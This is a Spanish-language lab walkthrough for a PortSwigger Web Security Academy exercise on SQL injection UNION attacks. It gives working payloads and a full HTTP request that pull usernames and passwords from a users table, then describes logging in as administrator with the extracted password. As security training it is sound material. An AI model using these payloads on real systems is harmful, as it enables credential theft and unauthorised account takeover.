# Lab 03 — SQL injection UNION attack, retrieving data from other tables

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Extraer usernames y passwords desde la tabla `users` usando `UNION SELECT`, encontrar las credenciales de `administrator` e iniciar sesión con ellas.

URL oficial:

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

# Qué enseña este lab

Los dos labs anteriores prepararon exactamente esto:

```text
1. saber cuántas columnas hay
2. saber cuáles aceptan texto
3. usar esas columnas para recuperar información real
```

La base de datos contiene:

```text
tabla: users
columnas: username, password
```

---

# Procedimiento oficial paso a paso

## Paso 1 — Capturar el filtro de categoría

Intercepta una request de categoría con Burp:

```text
Proxy → Intercept
```

Localiza el parámetro `category`.

## Paso 2 — Verificar estructura

PortSwigger indica verificar que la consulta devuelve **2 columnas y ambas aceptan texto** usando:

```text
'+UNION+SELECT+'abc','def'--
```

Si funciona, sabes que puedes devolver dos strings directamente.

## Paso 3 — Extraer `users`

Cambia `category` por:

```text
'+UNION+SELECT+username,+password+FROM+users--
```

Envía la request.

## Paso 4 — Leer la Response

La aplicación mezclará las filas de `users` con los resultados normales del producto.

Busca algo parecido a:

```text
administrator
<password>
```

También pueden aparecer otros usuarios.

## Paso 5 — Iniciar sesión

Copia la contraseña correspondiente a `administrator`.

Ve a:

```text
My account
```

Inicia sesión con:

```text
username: administrator
password: <valor extraído>
```

El lab debe marcarse como **Solved**.

---

# Request clave

```http
GET /filter?category='+UNION+SELECT+username,+password+FROM+users-- HTTP/2
```

Semánticamente:

```sql
' UNION SELECT username, password FROM users--
```

---

# Por qué funciona

La consulta original devuelve dos columnas compatibles con texto. `UNION` permite añadir filas provenientes de otra tabla mientras la estructura sea compatible.

Conceptualmente:

```sql
SELECT columna1, columna2 FROM products ...
UNION
SELECT username, password FROM users
```

El resultado final contiene datos de ambas consultas.

---

# Qué debes observar

Aquí sí buscas **datos reales en la Response**, no simplemente ausencia de error.

```text
UNION válido
→ filas de users aparecen en la respuesta
→ localizar administrator
→ usar su password
```

---

# Burp que tengo que aprender

- reutilizar conocimiento de número/tipo de columnas;
- editar `UNION SELECT` en Repeater o Intercept;
- leer datos inyectados dentro de una Response HTML;
- distinguir username y password;
- convertir extracción SQLi en impacto real iniciando sesión.

---

# Checklist

- [ ] Confirmé 2 columnas de texto.
- [ ] Envié `UNION SELECT username,password FROM users`.
- [ ] Localicé `administrator`.
- [ ] Copié su contraseña.
- [ ] Inicié sesión como administrator.
- [ ] Lab Solved.

# Regla para recordar

```text
UNION no solo prueba SQLi:
puede hacer que datos de otra tabla aparezcan en la respuesta original.
```
